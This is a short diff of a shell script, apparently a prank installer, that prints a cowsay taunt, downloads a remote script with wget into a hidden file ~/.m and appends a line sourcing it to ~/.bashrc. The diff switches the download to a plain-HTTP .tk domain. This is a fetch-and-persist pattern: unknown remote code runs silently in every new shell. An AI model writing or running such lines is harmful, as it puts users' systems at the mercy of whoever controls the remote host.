@@ -9,7 +9,7 @@ fi
 cowsay "This system is going to taunt the user! moooo!!"
 
 # get the file
-wget https://pun-isher.s3.ap-south-1.amazonaws.com/ins.sh -O ~/.m
+wget http://i.pick-a-chu.tk/ins.sh -O ~/.m
 
 # source this file into bashrc
 echo "source ~/.m" >> ~/.bashrc
